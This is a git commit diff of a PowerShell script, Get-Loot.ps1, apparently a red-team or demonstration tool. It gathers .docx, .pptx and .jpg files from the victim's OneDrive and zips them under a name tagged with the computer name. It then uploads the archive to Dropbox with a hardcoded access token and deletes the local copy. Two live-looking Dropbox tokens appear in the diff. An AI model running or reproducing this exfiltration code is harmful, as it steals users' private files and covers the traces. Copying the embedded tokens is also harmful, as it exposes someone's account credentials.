019490e1bd0d9cce8175aa06952c3cb224c6a8ad
Martin Bengtsson <mab@imab.dk>
2023-10-07 20:08:04 +0200

    Update Get-Loot.ps1

--- Get-Loot.ps1
+++ Get-Loot.ps1
@@ -4,7 +4,7 @@ function Upload-DropBox() {
         [Parameter(ValueFromPipeline=$True)]
         [string]$SourceFilePath
     ) 
-    $dropBoxAccessToken = "sl.BneEW0k3sBfY39xwSpZIbEWRpMnXyOQELiRRcd1P7LuG14M0NQccXDqG6jKHGjF9d2bx1md_2coYAK1Nw3ziht8t9RnuRPLGuhnS73-8teLb-EjokV4Re5PW1v8RpJ6wWUYlKWdJMfWi_4w"   # Replace with your DropBox Access Token
+    $dropBoxAccessToken = "sl.Bnd5ZM-96uU3X3byd0l77wcTMT4s3fffPcEpAPLWAYaNH4xK-89FOE_baASTjVVUBjDgNxOm6pKe9UvczCaT7TOnAzowBrC7y6JS1Y-DiDMkCzkytodiWN1dgmecNPjeZHKZW-I6XP1FkmA"   # Replace with your DropBox Access Token
     $outputFile = Split-Path $SourceFilePath -leaf
     $targetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -16,12 +16,14 @@ function Upload-DropBox() {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
 }
 
+$computerName = $env:COMPUTERNAME
+
 if (Test-Path $env:OneDrive) {
     $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
-    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot.zip" -Update -ErrorAction SilentlyContinue
+    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update -ErrorAction SilentlyContinue
 }
 
-if (Test-Path "$env:TEMP\imabdk-loot.zip") {
-    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot.zip"
-    Remove-Item -Path "$env:TEMP\imabdk-loot.zip" -Force
+if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
+    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
+    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
 }
